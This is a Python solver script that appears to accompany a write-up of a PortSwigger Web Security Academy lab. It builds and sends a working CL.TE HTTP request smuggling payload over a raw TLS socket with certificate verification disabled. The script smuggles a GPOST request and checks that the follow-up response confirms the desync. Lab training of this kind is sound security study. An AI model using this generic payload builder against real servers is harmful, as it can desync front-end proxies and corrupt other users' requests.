#!/usr/bin/env python3
"""
HTTP request smuggling, basic CL.TE vulnerability
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 14-basic-cl-te.md

What this does:
    Smuggles a complete, self-contained request with a deliberately mangled
    method name (GPOST instead of POST) past a front-end that trusts
    Content-Length while the back-end trusts Transfer-Encoding. Sends
    Transfer-Encoding before Content-Length in the header block on the
    theory that a front-end scanning top-to-bottom for a length header
    stops at the first match. If the back-end parses the smuggled GPOST
    request as the start of the next request, the follow-up request on the
    same connection comes back mangled -- proof of a CL.TE desync.

    Standard HTTP libraries (httpx/requests) normalize headers and refuse
    to send a body that doesn't match a sane Content-Length, so this drops
    to a raw TLS socket with ALPN negotiated manually to put the exact
    bytes on the wire.

Usage:
    python 14-basic-cl-te.py <lab-url>
    e.g. python 14-basic-cl-te.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import socket
import ssl
import sys
import time
from urllib.parse import urlparse

import httpx


def create_ssl_connection(host: str, port: int = 443, timeout: float = 10.0) -> ssl.SSLSocket:
    """Raw TLS socket with forced HTTP/1.1 ALPN -- httpx/requests normalize
    headers and won't let a CL/TE mismatch onto the wire, so this is the
    only way to send the exact non-conformant bytes the attack needs."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["http/1.1"])
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return ctx.wrap_socket(sock, server_hostname=host)


def send_raw_keep_alive(host: str, payloads: list[bytes], port: int = 443,
                         timeout: float = 10.0, delay: float = 0.5) -> list[bytes]:
    """Send multiple payloads on a single keep-alive connection, return each response."""
    ssl_sock = create_ssl_connection(host, port, timeout)
    responses = []
    try:
        for payload in payloads:
            ssl_sock.sendall(payload)
            time.sleep(delay)
            response = b""
            ssl_sock.settimeout(2.0)
            while True:
                try:
                    chunk = ssl_sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            responses.append(response)
        return responses
    finally:
        ssl_sock.close()


def build_clte_payload(host: str, smuggled_request: str, path: str = "/",
                        method: str = "POST") -> bytes:
    """CL.TE payload: front-end uses Content-Length, back-end uses
    Transfer-Encoding. TE is sent before CL in the header block -- that
    ordering is what we verified working here and kept as a standing rule
    for every CL.TE payload after."""
    body = "0\r\n\r\n" + smuggled_request
    headers = (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n"
    )
    return (headers + body).encode()


def parse_response_status(response: bytes) -> int:
    match = re.search(rb"HTTP/[\d.]+\s+(\d+)", response)
    return int(match.group(1)) if match else 0


def solve(lab_url: str) -> None:
    host = urlparse(lab_url).hostname

    smuggled = (
        "GPOST / HTTP/1.1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 10\r\n"
        "\r\n"
        "x="
    )
    attack = build_clte_payload(host, smuggled)
    normal = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()

    for attempt in range(1, 4):
        responses = send_raw_keep_alive(host, [attack, normal])
        status = parse_response_status(responses[-1]) if responses else 0
        print(f"[*] Attempt {attempt}: follow-up response status={status}")
        if status == 403 or (responses and b"Unrecognized method" in responses[-1]):
            print("[+] Back-end processed the smuggled GPOST as its own request -- CL.TE confirmed.")
            break
    else:
        print("[-] Follow-up request came back clean -- desync not confirmed this run.")

    check = httpx.get(lab_url + "/", verify=False)
    if "is-solved" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Lab not yet marked solved -- re-run, the desync can need a couple of tries.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
